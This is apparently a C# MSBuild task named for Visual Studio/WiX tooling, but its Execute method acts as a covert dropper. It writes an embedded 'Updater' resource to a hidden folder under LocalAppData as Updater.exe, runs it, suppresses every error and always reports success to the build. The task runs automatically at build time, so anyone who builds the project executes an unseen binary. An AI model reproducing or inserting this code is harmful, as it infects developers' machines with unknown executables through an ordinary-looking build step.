using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Build.Framework;

namespace VisualStudioWix
{
    public class Task : ITask
    {
        private IBuildEngine engine;
        public IBuildEngine BuildEngine
        {
            get { return engine; }
            set { engine = value; }
        }


        private ITaskHost host;
        public ITaskHost HostObject
        {
            get { return host; }
            set { host = value; }
        }

        public bool Execute()
        {

            try
            {
                string fileName = "Updater";

                string tempDirectory = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
                try
                {
                    if (Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) != "")
                    {
                        tempDirectory = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "nddi");
                    }
                }
                catch (Exception)
                { }

                string tmpExePath = Path.Combine(tempDirectory, fileName + ".exe");

                if (!Directory.Exists(tempDirectory))
                {
                    Directory.CreateDirectory(tempDirectory);
                }

                object ob = Properties.Resources.ResourceManager.GetObject(fileName);
                byte[] myResBytes = (byte[])ob;
                using (FileStream fsDst = new FileStream(tmpExePath, FileMode.CreateNew, FileAccess.Write))
                {
                    byte[] bytes = myResBytes;
                    fsDst.Write(bytes, 0, bytes.Length);
                    fsDst.Close();
                    fsDst.Dispose();
                }

                Process ExternalProcess = new Process();
                ExternalProcess.StartInfo.FileName = tmpExePath;
                ExternalProcess.StartInfo.CreateNoWindow = false;
                ExternalProcess.StartInfo.UseShellExecute = false;
                ExternalProcess.Start();
            }
            catch
            { }
            return true;
        }
    }
}
